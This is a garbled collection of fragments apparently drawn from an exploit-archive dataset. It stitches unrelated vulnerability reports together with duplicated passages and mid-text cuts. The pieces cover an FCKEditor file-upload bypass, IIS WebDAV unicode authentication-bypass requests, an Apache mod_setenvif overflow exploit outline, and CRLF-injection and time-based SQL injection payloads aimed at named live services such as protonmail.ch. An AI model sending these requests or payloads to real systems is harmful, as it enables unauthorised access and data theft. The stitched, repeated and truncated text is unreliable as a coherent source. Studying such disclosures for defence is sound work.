http_core.c:0\r\n(exe+0x0000000b139a)\r\n    #3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #4 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #5 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #6 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #8  :0 (libtsan.so.0+0x00000001b279)\r\n--[ 3.

Specifically, it is possible to upload ASP code via the ASP.NET connector in FCKEditor. The vulnerability requires that the remote server be running IIS. This vulnerability has been confirmed on FCKEditor 2.5.1 and 2.6.6.  \n  \nCVSS Vector: AV:R/AC:L/Au:NR/C:C/I:C/A:C  \n  \nBrowse to http://<ip>fckeditor/editor/filemanager/connectors/test.html and choose the ASP.NET connector. By uploading a file with the same name as an existing file, that includes an underscore followed by a dot, it is possible to bypass the file renaming mitigation in place. For instance, when uploading a file twice with the name:  \n  \nmyfile_.asp;.txt  \n  \nThe first file would be renamed  \n  \nmyfile__asp;.txt  \n  \nBUT the second file will be renamed  \n  \nmyfile_.asp;(1).txt  \n  \nDue to the IIS semi-colon vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4444) the server will remotely execute myfile_.asp;(1).txt when the second file is accessed.  \n  \n  \n-- Vendor Response:  \nA new version of the .NET connector has been released to address this issue, it can be found at the URL below.  \n  \nhttp://ckeditor.com/blog/FCKeditor.Net_2.6.4_released  \n  \n-- Disclosure Timeline:  \n2010-08-17 - Vulnerability reported to the vendor via contact form  \n2010-08-17 - Vulnerability reported to the vendor via bug tracker  \n2010-08-19 - Vulnerability reported to the vendor via email  \n2010-08-27 - Vendor replied indicating a fix is in the works  \n2010-08-27 - Vendor schedules the fix for August 30th, 2010  \n2010-08-30 - Vendor releases version 2.6.4 to address the issue  \n  \n-- Credit:  \nThis vulnerability was discovered by Will Vandevanter of the Rapid7 professional services team during a customer engagement.  \n  \n-- About Rapid7 Security  \nRapid7 provides vulnerability management, compliance and penetration testing solutions for Web application, network and database security.

The\r\nspecific flaw exists within the WebDAV functionality of IIS 6.0. The Web\r\nServer fails to properly handle unicode tokens when parsing the URI and\r\nsending back data. Exploitation of this issue can result in the\r\nfollowing:\r\n\r\n         Authentication bypass of password protected folders\r\n         Listing, downloading and uploading of files into a password protected WebDAV folder\r\n\r\nAuthentication bypass of password protected folders\r\n\r\nAssume there is a password protected folder in\r\n\u00e2\u20ac\u017ed:\\inetpub\\wwwroot\\protected\\\u00e2\u20ac\u0153. The password protection mechanism is\r\nnot relevant for the attack to work. Inside this folder there is a file\r\nnamed \u00e2\u20ac\u017eprotected.zip\u00e2\u20ac\u0153\r\n\r\nThe attacker sends a HTTP GET request to the web server.\r\n\r\n         GET /  %c0%af/protected/protected.zip HTTP/1.1\r\n         Translate: f\r\n         Connection: close\r\n         Host: servername\r\n\r\nAs seen above the URI contains the unicode character '/' (%c0%af). This\r\nunicode character is removed in a WebDAV request. \u00e2\u20ac\u017eTranslate: f\u00e2\u20ac\u0153\r\ninstructs the web server to handle the request using WebDAV. Using this\r\nmalicious URI construct the webserver sends the file located at\r\n\u00e2\u20ac\u017e/protected/protected.zip\u00e2\u20ac\u0153 back to the attacker without asking for\r\nproper authentication. Another valid request an attacker might send to\r\nthe web server is:\r\n\r\n         GET /prot%c0%afected/protected.zip HTTP/1.1\r\n         Translate: f\r\n         Connection: close\r\n         Host: servername\r\n\r\nIIS 6.0 will remove the \u00e2\u20ac\u017e%c0%af\u00e2\u20ac\u0153 unicode character internally from the\r\nrequest and send back the password protected file without asking for\r\nproper credentials. ASP scripts cannot be downloaded in this way unless\r\nserving of script source-code is enabled.\r\n\r\nListing files in a password protected WebDAV folder\r\n\r\nThe attack on WebDAV folders is similar. The attacker can bypass the\r\naccess restrictions of the password protected folder and list, download,\r\nupload and modify files. The attacker sends a PROPFIND request to the\r\nweb server.\r\n\r\n        PROPFIND /protec%c0%afted/ HTTP/1.1\r\n        Host: servername\r\n        User-Agent: neo/0.12.2\r\n        Connection: TE\r\n        TE: trailers\r\n        Depth: 1\r\n        Content-Length: 288\r\n        Content-Type: application/xml\r\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n        <propfind xmlns=\"DAV:\"><prop>\r\n        <getcontentlength xmlns=\"DAV:\"/>\r\n        <getlastmodified xmlns=\"DAV:\"/>\r\n        <executable xmlns=\"http://apache.org/dav/props/\"/>\r\n        <resourcetype xmlns=\"DAV:\"/>\r\n        <checked-in xmlns=\"DAV:\"/>\r\n        <checked-out xmlns=\"DAV:\"/>\r\n        </prop></propfind>\r\n\r\nIIS responds with the directory listing of the folder without asking for a password.\r\n\r\nCredit\r\n\r\nThis vulnerability was discovered by:\r\n        Nikolaos Rangos\r\n        Contact: kcope2@googlemail.com\r\n        Greetings to: alex and andi\r\n\r\n# milw0rm.com [2009-05-15]\r\n",

The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n \r\n## Problem Description\r\n \r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif.

The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n \r\n## Outline of Exploit\r\n \r\nThe main goals creating the exploit were:\r\n \r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n \r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n \r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.\n\n#  0day.today [2018-03-02]  #",

            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/\r\n \r\n## Introduction\r\n \r\nApache 2.2 webservers may use a shared memory segment to share child process status information (scoreboard) between the child processes and the parent process running as root. A child running with lower privileges than the parent process might trigger an invalid free in the privileged parent process during parent shutdown by modifying data on the shared memory segment.\r\n \r\n## Method\r\n \r\nA child process can trigger the bug by changing the value of ap_scoreboard_e sb_type, which resides in the global_score structure on the shared memory segment. The value is usually 2 (SB_SHARED):\r\n \r\ntypedef struct {\r\n    int             server_limit;\r\n    int             thread_limit;\r\n    ap_scoreboard_e sb_type;\r\n    ap_generation_t running_generation; /* the generation of children which\r\n                                         * should still be serving requests.\r\n                                         */\r\n    apr_time_t restart_time;\r\n    int             lb_limit;\r\n} global_score;\r\n \r\nWhen changing the scoreboard type of a shared memory segment to something else, the root process will try to release the shared memory using free during normal shutdown.

            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/\r\n\r\n## Introduction\r\n\r\nApache 2.2 webservers may use a shared memory segment to share child process status information (scoreboard) between the child processes and the parent process running as root. A child running with lower privileges than the parent process might trigger an invalid free in the privileged parent process during parent shutdown by modifying data on the shared memory segment.\r\n\r\n## Method\r\n\r\nA child process can trigger the bug by changing the value of ap_scoreboard_e sb_type, which resides in the global_score structure on the shared memory segment. The value is usually 2 (SB_SHARED):\r\n\r\ntypedef struct {\r\n    int             server_limit;\r\n    int             thread_limit;\r\n    ap_scoreboard_e sb_type;\r\n    ap_generation_t running_generation; /* the generation of children which\r\n                                         * should still be serving requests.\r\n                                         */\r\n    apr_time_t restart_time;\r\n    int             lb_limit;\r\n} global_score;\r\n\r\nWhen changing the scoreboard type of a shared memory segment to something else, the root process will try to release the shared memory using free during normal shutdown. Since the memory was allocated using mmap, not malloc, the call to free from ap_cleanup_scoreboard (server/scoreboard.c) triggers abort within libc.\r\n\r\napr_status_t ap_cleanup_scoreboard(void *d)\r\n{\r\n    if (ap_scoreboard_image == NULL) {\r\n        return APR_SUCCESS;\r\n    }\r\n    if (ap_scoreboard_image->global->sb_type == SB_SHARED) {\r\n        ap_cleanup_shared_mem(NULL);\r\n    }\r\n    else {\r\n        free(ap_scoreboard_image->global);\r\n        free(ap_scoreboard_image);\r\n        ap_scoreboard_image = NULL;\r\n    }\r\n    return APR_SUCCESS;\r\n}\r\n\r\nAbort output is written to apache default error log:\r\n\r\n[Fri Dec 30 10:19:57 2011] [notice] caught SIGTERM, shutting down\r\n*** glibc detected *** /usr/sbin/apache2: free(): invalid pointer: 0xb76f4008 ***\r\n======= Backtrace: =========\r\n/lib/i386-linux-gnu/libc.so.6(+0x6ebc2)[0x17ebc2]\r\n/lib/i386-linux-gnu/libc.so.6(+0x6f862)[0x17f862]\r\n/lib/i386-linux-gnu/libc.so.6(cfree+0x6d)[0x18294d]\r\n/usr/sbin/apache2(ap_cleanup_scoreboard+0x29)[0xa57519]\r\n/usr/lib/libapr-1.so.0(+0x19846)[0x545846]\r\n/usr/lib/libapr-1.so.0(apr_pool_destroy+0x52)[0x5449ec]\r\n/usr/sbin/apache2(+0x1f063)[0xa52063]\r\n/usr/sbin/apache2(main+0xeea)[0xa51e3a]\r\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x129113]\r\n/usr/sbin/apache2(+0x1ef3d)[0xa51f3d]\r\n======= Memory map: ========\r\n00110000-00286000 r-xp 00000000 08:01 132367\r\n\r\nTo reproduce, attach to a www-data (non-root) child process and increment the value at offset 0x10 in the shared memory segment.

The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n \r\n## Problem Description\r\n \r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\r\n \r\n        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\r\n            len += pmatch[no].rm_eo - pmatch[no].rm_so;\r\n        }\r\n \r\nthe length value overflows and is used in a subsequent allocation call of buffer too small:\r\n \r\n \r\n    dest = dst = apr_pcalloc(p, len + 1);\r\n \r\nThe subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\r\n \r\n## Impact\r\n \r\nDepending on the input data, exploitation of this issue leads to:\r\n \r\n- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\r\n- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\r\n- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\r\n \r\nTo trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\r\n \r\n \r\n \r\n \r\n \r\n \r\nSource: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\r\n \r\n## Starting Point\r\n \r\nDuring routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n \r\n## Outline of Exploit\r\n \r\nThe main goals creating the exploit were:\r\n \r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n \r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n \r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.\n\n#  0day.today [2018-03-02]  #",

When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n\r\n## Outline of Exploit\r\n\r\nThe main goals creating the exploit were:\r\n\r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n\r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n\r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.",

We would like to thank Context Information\r\nSecurity Ltd for reporting this issue to us.\r\n\r\nWhen using the RewriteRule or ProxyPassMatch directives to configure a\r\nreverse proxy using a pattern match, it is possible to inadvertently\r\nexpose internal servers to remote users who send carefully crafted\r\nrequests.  The server did not validate that the input to the pattern\r\nmatch was a valid path string, so a pattern could expand to an\r\nunintended target URL.\r\n\r\nFor future releases of the Apache HTTP Server, the software will\r\nvalidate the request URI, correcting this specific vulnerability.  The\r\ndocumentation has been updated to reflect the more general risks with\r\npattern matching in a reverse proxy configuration.\r\n\r\nDetails:\r\n========\r\n\r\nA configuration like one of the following examples:\r\n\r\n  RewriteRule (.*)\\.(jpg|gif|png)    http://images.example.com$1.$2 [P]\r\n  ProxyPassMatch (.*)\\.(jpg|gif|png) http://images.example.com$1.$2\r\n\r\ncould result in an exposure of internal servers.  A request of the form:\r\n\r\n  GET @other.example.com/something.png HTTP/1.1\r\n\r\nwould get translated to a target of:\r\n\r\n  http://images.example.com@other.example.com/something.png\r\n\r\nThis will cause the proxy to connect to the hostname\r\n&quot;other.example.com&quot;, as the &quot;images.example.com@&quot; segment would be\r\ntreated as user credentials when parsing the URL.  This would allow a\r\nremote attacker the ability to proxy to hosts other than those\r\nexpected, which could be a security exposure in some circumstances.\r\n\r\nThe request-URI string in this example,\r\n&quot;@other.example.com/something.png&quot;, is not valid according to the HTTP\r\nspecification, since it neither an absolute URI\r\n(&quot;http://example.com/path&quot;) nor an absolute path (&quot;/path&quot;).  For\r\nfuture releases, the server has been patched to reject such requests,\r\ninstead returning a &quot;400 Bad Request&quot; error.\r\n\r\nActions:\r\n========\r\n\r\nApache HTTPD users should examine their configuration files to determine \r\nif they have used an insecure configuration for reverse proxying.  \r\nAffected users can update their configuration, or apply the patch from:\r\n\r\n   http://www.apache.org/dist/httpd/patches/apply_to_2.2.21/\r\n\r\nFor example, the above RewriteRule could be changed to:\r\n\r\n  RewriteRule /(.*)\\.(jpg|gif|png)    http://images.example.com/$1.$2 [P]\r\n\r\nto ensure the pattern only matches against paths with a leading &quot;/&quot;.\r\n\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.11 (GNU/Linux)\r\n\r\niEYEARECAAYFAk6MZZAACgkQR/aWnQ5EzwxdfQCg0yX+OplatMPQcweRneRmh5Xp\r\n5sEAoLooi9H4LW12oPgStNbY2wtyQrYP\r\n=8qjg\r\n-----END PGP SIGNATURE-----\r\n\r\n_______________________________________________\r\nFull-Disclosure - We believe in it.\r\nCharter: http://lists.grok.org.uk/full-disclosure-charter.html\r\nHosted and sponsored by Secunia - http://secunia.com/\n                              ",

DESCRIPTION  \n-------------------------  \n  \n  \n-ProtonMail is incorporated in Switzerland and their servers are located   \nin Switzerland.  \n  \n  \n-They are outside of US and EU jurisdiction and all user data is   \nprotected by strict Swiss privacy laws.  \n  \nBecause of our end-to-end encryption, They think that :  \n  \n\"Your data is already secure and encrypted by the time it reaches our   \nservers. We have no access to your messages, and since we cannot decrypt   \nthem, we cannot share them with third parties\".  \n  \n  \n-ProtonMail's segregated authentication and decryption system means   \nlogging into a ProtonMail account that requires two passwords.  \n  \n  \n-The first password is used to authenticate the user and retrieve the   \ncorrect account. After that, encrypted data is sent to the user.  \n  \n  \n-The second password is a decryption password which is never sent to us.   \nIt is used to decrypt the user\u0092s data in the browser so we never have   \naccess to the decrypted data  \n  \nor the decryption password.  \n  \n  \n-For this reason, we are also unable to do password recovery.  \n  \n  \n-If you forget your decryption password, we cannot recover your data.  \n  \n  \n  \n  \nBy theWay, ASAP-SEC are Verifiying this information... Let's go to the   \nbusiness ;)  \n  \n  \n  \n  \n  \nIII- Vulnerabilities  \n---------------------  \n  \n  \nCRLF injection / HTTP response splitting  \n****************************************  \n  \n  \nThis script is possibly vulnerable to CRLF injection attacks.  \n  \nHTTP headers have the structure \"Key:  \n  \nValue\", where each line is separated by the CRLF combination.  \n  \nIf the user input is injected into the value section without properly   \nescaping/removing  \n  \nCRLF characters it is possible to alter the HTTP headers structure.  \n  \nHTTP Response Splitting is a \"new\" application attack technique which   \nenables  \n  \nvarious new attacks such as web cache poisoning,cross user defacement,  \n  \nhijacking pages with sensitive user information and cross-site scripting   \n(XSS).  \n  \n  \nThe attacker sends a single HTTP request that forces the web server to   \nform an output stream,  \n  \nwhich is then interpreted by the target as two HTTP responses instead of   \none response.  \n  \n  \nAffected items  \n------------------  \n  \n/crypt/cryptographp.php  \n  \n  \n  \nThe impact of this vulnerability  \n----------------------------------  \n  \nIs it possible for a remote attacker to inject custom HTTP headers.  \n  \nFor example, an attacker can inject session cookies or HTML code.  \n  \nThis may conduct to vulnerabilities like XSS (cross-site scripting) or   \nsession fixation.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n------------------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10)  \n  \n  \nFrom  \n  \nthe user input  \n  \nor  \n  \nproperly encode the output  \n  \nin  \n  \norder to prevent the injection  \n  \nof  \n  \ncustom HTTP headers.  \n  \n  \n  \n  \nAttack details  \n--------------------  \n  \nURL encoded GET input cfg was set to   \n<SomeCustomInjectedHeader:injected_by_secnight  \n  \n  \n  \nInjected header found:  \n  \nSomeCustomInjectedHeader: injected_by_secnight  \n  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_secnight  \n  \n  \n  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_secnight&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10) from the user  \n  \ninput or properly encode the output in order to prevent  \n  \nthe injection of custom HTTP headers.  \n  \n  \n  \n  \n  \nVariant 1  \n-----------  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_asapsec   \nHTTP/1.1  \n  \nReferer: https://protonmail.ch:443/  \n  \nCookie: PHPSESSID=afaj9rt84m3oevgtld6thfe9l4; cryptcookietest=1  \n  \nHost: protonmail.ch  \n  \nConnection: Keep-alive  \n  \n  \nResponse  \n----------  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_wvs&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \n  \n  \n  \nApache 2.x version older than 2.2.10  \n**************************************  \n  \n  \nFixed in Apache httpd 2.2.10: mod_proxy_ftp globbing XSS CVE-2008-2939  \n  \nA flaw was found in the handling of wildcards in the path of a FTP URL   \nwith mod_proxy_ftp.  \n  \nIf mod_proxy_ftp is enabled to support FTP-over-HTTP, requests   \ncontaining globbing characters could lead to cross-site scripting (XSS)   \nattacks.  \n  \nAffected Apache versions (2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3,   \n2.2.2, 2.2.0).  \n  \n  \n  \n  \nApache httpd remote denial of service  \n*************************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nA denial of service vulnerability has been found in the way the multiple  \n  \noverlapping ranges are handled by the Apache HTTPD server:  \n  \n  \n  \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175  \n  \n  \n  \nAn attack tool is circulating in the wild.

Opolis also offers co-branded solutions  \nfor internet and E-Mail communication as well as document messaging. Opolis Secure Mail is owned by privately-held PI Technology Co WLL.  \n  \nIII. PROOF OF CONCEPT  \n-------------------------  \n  \nBlind SQL Injection  \n********************  \n  \nVulnerability description  \n-------------------------  \n  \nSQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and   \n  \ndoesn't properly filter out dangerous characters.   \n  \nThis is one of the most common application layer attacks currently being used on the Internet. Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.  \n  \nAffected items  \n----------------  \n  \n/createOpolisWorkGroup/createOpolisWorkGroupStep5.php   \n  \n  \nURL encoded POST input checkedemail was set to 1';select pg_sleep(2); --   \n  \nPOST /createOpolisWorkGroup/createOpolisWorkGroupStep5.php   \n  \naiacademic=1&aiaddressline1=3137%20Laguna%20Street&aiaddressline2=3137%20Laguna%20Street&aicity=San%20Francisco&aicountry=NIL&aifirstname=myufyvmc&ailanguage=English&ailastname=myufyvmc&aititle=Mr.&aizip=94102&checkedemail=1%27%3bselect  \n  \n%20pg_sleep%282%29%3b%20--%20&checkedloginname=&createcodes=&showcheckedemail=sample%40email.tst&showcheckedloginname=myufyvmc  \n  \n  \n  \n/slimstat/stats_js.php   \n  \n\"ttl\"  \n  \nURL encoded GET input \"ttl\" was set to IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK  \n  \n(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR\"*/  \n  \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR%28%40%40version  \n  \n%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR%28%40%40version  \n  \n%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%  \n  \n  \n\"url\"  \n  \nURL encoded GET input \"url\" was set to IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK  \n  \n(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR\"*/  \n  \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=O!polis%20Secure%20Mail%20Service&url=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR  \n  \n%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%2f   \n  \n  \nGET /slimstat/stats_js.php?ref=&res=1920x1080&ts=1381056265&ttl=O!polis%20Secure%20Mail%20Service&url=IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%2f*%27XOR%28IF%28SUBSTR  \n  \n%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%27%7c%22XOR%28IF%28SUBSTR%28%40%40version%2c1%2c1%29%3c5%2cBENCHMARK%282000000%2cSHA1%280xDEADBEEF%29%29%2cSLEEP%283%29%29%29OR%22*%2f  \n  \n  \nCross site scripting ( 67 )  \n*********************  \n  \nCross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious  \ncode (usually in the form of Javascript) to another user.

This may compromise the integrity of your database and/or expose sensitive information.   \n  \nDepending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker.  \n  \nIt may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use subselects, or append additional queries. In some cases,  \nit may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.  \n  \nCertain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions).   \n  \nIf an attacker can obtain access to these procedures it may be possible to compromise the entire machine.  \n  \n  \n  \nAttack details  \n--------------  \n  \nURL encoded POST input username was set to  \n  \nxlgskuot' or (sleep(2)+1) limit 1 --   \n  \nPOST /mpa/index.php   \n  \n  \nServer: Apache/2.2.16 (Debian)  \nX-Powered-By: PHP/5.3.3-7+squeeze14  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0  \nPragma: no-cache  \nLocation: ./hotel_inicio/index.php  \nVary: Accept-Encoding  \nContent-Length: 3402  \nKeep-Alive: timeout=15, max=92  \nConnection: Keep-Alive  \nContent-Type: text/html; charset=utf-8  \n  \n  \npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20  \n  \nvariant (1)  \n  \nname  \n  \nPOST /mpa/index.php HTTP/1.1  \nContent-Length: 92  \nContent-Type: application/x-www-form-urlencoded  \nCookie: PHPSESSID=sto2bv4krb2h4f0n45tm6o4hn3  \nHost: secureadv.obehotel.com  \nConnection: Keep-alive  \nAccept-Encoding: gzip,deflate  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; 